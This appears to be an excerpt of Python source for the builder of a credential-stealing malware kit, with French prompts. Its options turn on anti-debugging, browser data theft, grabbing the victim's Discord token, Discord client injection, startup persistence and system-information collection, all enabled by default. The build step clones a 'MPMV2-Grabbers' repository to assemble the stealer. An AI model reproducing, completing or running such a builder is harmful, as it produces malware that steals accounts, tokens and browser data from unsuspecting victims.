    ...
    def __init__(self) -> None:
        self.questions = [
            ...
            },
            {
                "type": "confirm",
                "name": "antidebug",
                "message": "Activer l'anti-débugage?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "browsers",
                "message": "Activer le vol de navigateur?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "discordtoken",
                "message": "Récupérer le token de la personne?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "injection",
                "message": "Activé l'injection discord?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "startup",
                "message": "Activer des le démarrage?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "systeminfo",
                "message": "Activer les informations système?",
                "default": True,
            },
        ]
...
class MakeEnv:
    ...
    def get_src(self) -> None:
        ...
        """
        subprocess.run(
            ['git', 'clone', 'git@github.com:PMP667/MPMV2-Grabbers.git'], cwd=self.build_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        shutil.move(os.path.join(self.build_dir,
                    'MPMV2-Grabbers', 'src'), self.build_dir)
...
def main() -> None:
    ...
    with progress:
        ...
        task4 = progress.add_task("[bold green]Construction...", total=1)
        build = Build()
